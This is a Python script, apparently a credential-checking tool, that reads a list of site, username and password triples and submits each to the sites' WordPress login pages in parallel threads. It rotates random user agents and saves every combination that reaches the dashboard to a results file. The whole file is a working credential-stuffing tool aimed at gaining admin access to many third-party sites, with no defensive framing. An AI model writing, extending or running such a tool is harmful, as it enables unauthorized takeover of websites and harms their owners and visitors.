# Author: SUSUDOSU 

import os
import requests
import random
import socket
import concurrent.futures
from sys import stdout
from colorama import Fore, init
init(autoreset=True)


FG = Fore.GREEN
FR = Fore.RED
FW = Fore.WHITE
FY = Fore.YELLOW
FC = Fore.CYAN

def dirdar():
    if not os.path.exists('Results'):
        os.mkdir('Results')

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def banners():
    # Display the ASCII art banner
    print("                                                                                         ")
    print(Fore.RED + "_______ _______ _______ _____  _______ _______ _______ _______ _______  ")
    print(Fore.RED + "|     __|   |   |    |  |     \|   _   |    |  |    ___|     __|    ___|")
    print(Fore.WHITE + "|__     |   |   |       |  --  |       |       |    ___|__     |    ___|")
    print(Fore.WHITE + "|_______|_______|__|____|_____/|___|___|__|____|_______|_______|_______|")
    print(Fore.RED + f"════════════╦══════════════════════════════════════════════╦════════════")
    # Display additional information about the host/device
    host_name = socket.gethostname()
    ip_address = socket.gethostbyname(host_name)
    print(Fore.RED + f"╔═══════════╩══════════════════════════════════════════════╩═══════════╗")
    print(Fore.LIGHTGREEN_EX + f"                     [ WORDPRESS LOGIN CHECKER ] ")
    print(Fore.RED + f"╚══════════════════════════════════════════════════════════════════════╝")
    print(Fore.RED + f"[ ! ]{Fore.RESET} Author: {Fore.LIGHTRED_EX}SUSUDOSU {Fore.LIGHTGREEN_EX}EST - 2023")
    print(f"{Fore.GREEN}[ {Fore.RED}! {Fore.GREEN}]{Fore.RESET} Device: {host_name}")
    print(f"{Fore.GREEN}[ {Fore.RED}! {Fore.GREEN}]{Fore.RESET} Host  : {ip_address}")
    print(Fore.RED + f"════════════════════════════════════════════════╝")
    print(f"{Fore.RED}[ ! ] {Fore.LIGHTWHITE_EX}Format must be : {Fore.LIGHTGREEN_EX}site.com/wp-login|username|password\n")

def users_agents():
    with open("lib/ua.txt", "r") as ua_file:
        user_agents = ua_file.readlines()
    user_agents = [ua.strip() for ua in user_agents if ua.strip()]
    return random.choice(user_agents)

def URLdomain(url):
    return url.split('/')[0]

def beluga(url, username, password):
    try:
        payload = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': f'https://{url}/wp-admin/',
            'testcookie': '1'
        }
        headers = {
            'User-Agent': users_agents(),
            'Referer': f'https://{url}/wp-login.php'
        }

        response = requests.post(f'https://{url}/wp-login.php', data=payload, headers=headers, timeout=30)

        if response.status_code == 200:
            if 'wp-admin' in response.url:
                print(f"{FY}[Wordpress] - {FG}[GOOD!] - {FW}https://{url} - {FC}{username}|{password}")
                with open("Results/Success.txt", "a") as f:
                    f.write(f"[+] URLs: https://{url}/wp-login.php\n[+] Username: {username}\n[+] Password: {password}\n\n")
            elif 'Dashboard' in response.text:  # Change 'Dashboard' to the appropriate keyword on the WordPress dashboard
                print(f"{FY}[Wordpress] - {FG}[GOOD!] - {FW}https://{url} - {FC}{username}|{password}")
                with open("Results/Success.txt", "a") as f:
                    f.write(f"[+] URLs: https://{url}/wp-login.php\n[+] Username: {username}\n[+] Password: {password}\n\n")
            else:
                print(f"{FY}[Wordpress] - {FR}[BAD!] - {FW}https://{url} - {FC}{username}|{password}")
        else:
            print(f"{FY}[Wordpress] - {FR}[BAD!] - {FW}https://{url} - {FC}{username}|{password}")
    except:
        pass


def parimalam(meow):
    with open(meow, 'r', encoding='utf-8') as file:
        urls = [line.strip() for line in file if "|" in line]
        with concurrent.futures.ThreadPoolExecutor() as executor:
            for url in urls:
                credentials = url.split("|")
                if len(credentials) == 3:
                    url, username, password = credentials
                    executor.submit(beluga, url, username, password)


def main():
    banners()
    meow = input(f"{FG}[ + ] LOGIN LIST: {FW}")
    parimalam(meow)


if __name__ == '__main__':
    main()
